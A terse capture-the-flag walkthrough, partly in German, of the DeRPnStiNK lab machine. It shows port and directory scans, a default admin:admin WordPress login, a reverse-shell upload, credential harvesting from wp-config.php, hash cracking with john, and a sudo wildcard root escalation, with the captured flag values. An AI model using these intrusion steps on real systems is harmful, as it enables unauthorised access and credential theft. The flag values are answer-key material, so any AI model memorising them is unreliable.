url=192.168.1.231

`nmap -p- $url`

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 09:37 CEST
Nmap scan report for derpnstink.local (192.168.1.231)
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 74.19 seconds
```





flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)



`feroxbuster -u http://$url:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -A --burp-replay --replay-codes 200,300,301`

```txta
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🎥  Replay Proxy          │ http://127.0.0.1:8080
 📼  Replay Proxy Codes    │ [200, 300, 301]
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
ERROR: Could not connect to any target provided

┌──(kali㉿kali)-[~/hacking/hacks/vm2]
└─$ url=192.168.1.231

┌──(kali㉿kali)-[~/hacking/hacks/vm2]
└─$ feroxbuster -u http://$url:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -A --burp-replay --replay-codes 200,300,301
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.231:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🎥  Replay Proxy          │ http://127.0.0.1:8080
 📼  Replay Proxy Codes    │ [200, 300, 301]
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      317c http://192.168.1.231/temporary => http://192.168.1.231/temporary/
200      GET       74l      119w     1036c http://192.168.1.231/css/style.css
200      GET      134l      245w     2653c http://192.168.1.231/js/index.js
200      GET       68l      503w     3771c http://192.168.1.231/webnotes/
200      GET      531l     2110w   184640c http://192.168.1.231/derp.png
301      GET        9l       28w      311c http://192.168.1.231/php => http://192.168.1.231/php/
200      GET      131l       95w     1298c http://192.168.1.231/
301      GET        9l       28w      314c http://192.168.1.231/weblog => http://192.168.1.231/weblog/
301      GET        9l       28w      311c http://192.168.1.231/php => http://192.168.1.231/php/
301      GET        9l       28w      311c http://192.168.1.231/css => http://192.168.1.231/css/
301      GET        9l       28w      314c http://192.168.1.231/weblog => http://192.168.1.231/weblog/
301      GET        9l       28w      310c http://192.168.1.231/js => http://192.168.1.231/js/
301      GET        9l       28w      318c http://192.168.1.231/javascript => http://192.168.1.231/javascript/
301      GET        9l       28w      318c http://192.168.1.231/javascript => http://192.168.1.231/javascript/
301      GET        9l       28w      311c http://192.168.1.231/php => http://192.168.1.231/php/
301      GET        9l       28w      311c http://192.168.1.231/css => http://192.168.1.231/css/
301      GET        9l       28w      310c http://192.168.1.231/js => http://192.168.1.231/js/
301      GET        9l       28w      318c http://192.168.1.231/javascript => http://192.168.1.231/javascript/
200      GET      131l       95w     1298c http://192.168.1.231/
301      GET        9l       28w      310c http://192.168.1.231/js => http://192.168.1.231/js/
301      GET        9l       28w      325c http://192.168.1.231/weblog/wp-content => http://192.168.1.231/weblog/wp-content/
301      GET        9l       28w      333c http://192.168.1.231/weblog/wp-content/uploads => http://192.168.1.231/weblog/wp-content/uploads/
301      GET        9l       28w      332c http://192.168.1.231/weblog/wp-content/themes => http://192.168.1.231/weblog/wp-content/themes/
301      GET        9l       28w      311c http://192.168.1.231/css => http://192.168.1.231/css/
301      GET        9l       28w      325c http://192.168.1.231/weblog/wp-content => http://192.168.1.231/weblog/wp-content/
301      GET        9l       28w      332c http://192.168.1.231/weblog/wp-content/themes => http://192.168.1.231/weblog/wp-content/themes/
301      GET        9l       28w      333c http://192.168.1.231/weblog/wp-content/plugins => http://192.168.1.231/weblog/wp-content/plugins/
301      GET        9l       28w      326c http://192.168.1.231/weblog/wp-includes => http://192.168.1.231/weblog/wp-includes/
301      GET        9l       28w      326c http://192.168.1.231/weblog/wp-includes => http://192.168.1.231/weblog/wp-includes/
301      GET        9l       28w      333c http://192.168.1.231/weblog/wp-includes/images => http://192.168.1.231/weblog/wp-includes/images/
301      GET        9l       28w      330c http://192.168.1.231/weblog/wp-includes/css => http://192.168.1.231/weblog/wp-includes/css/
301      GET        9l       28w      333c http://192.168.1.231/weblog/wp-content/upgrade => http://192.168.1.231/weblog/wp-content/upgrade/
301      GET        9l       28w      339c http://192.168.1.231/weblog/wp-includes/images/media => http://192.168.1.231/weblog/wp-includes/images/media/
```


## Wordpress

unter /weblog/wp-admin

anmelden mit `admin:admin`


revshell hochladen ueber slideshows und speichern


phpmyadmin creds under /var/www/html/weblog/wp-config.php: `root:mysql`

password for unclestinky in phpmyadmin under wordpress>wp_users: `$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41`


`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Password is `wedgie57`


flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)

flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)

pcap.trace under /home/strinky/Documents/derpissues.pcap

password in request 5616: `derpderpderpderpderpderpderp`


`sudo -l`

```txt
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```


new file: /home/mrderp/binaries/derpy.sh
```sh
#!/bin/bash

/bin/bash
```

`sudo ./derpy.sh`

flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)